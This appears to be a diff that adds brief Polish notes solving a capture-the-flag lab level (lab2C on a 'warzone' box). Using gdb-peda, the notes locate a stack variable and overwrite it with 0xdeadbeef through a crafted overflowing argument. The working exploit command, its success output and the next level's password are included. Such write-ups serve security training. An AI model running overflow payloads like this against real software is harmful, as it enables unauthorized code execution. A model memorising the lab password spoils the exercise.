@@ -1,0 +1,17 @@
+   0x8048718 <main+75>:	cmp    DWORD PTR [esp+0x2c],0xdeadbeef
+
+Trzeba w odpowiednie miejsce wrzucic 0xdeadbeef, czyli 
+
+gdb-peda$ r ABCDEFGHIJKLMNOPQRSTUWVZXC
+
+gdb-peda$ hexdump $esp+0x2c 8
+0xbffff6bc : 50 51 52 53 54 55 57 56                           PQRSTUWV
+
+Rozwiązanie:
+gdb-peda$ r "$(python -c 'print "ABCDEFGHIJKLMNO"+"\xef\xbe\xad\xde"')"
+
+lab2C@warzone:/levels/lab02$ ./lab2C "$(python -c 'print "ABCDEFGHIJKLMNO"+"\xef\xbe\xad\xde"')"
+You did it.
+
+pass:
+1m_all_ab0ut_d4t_b33f
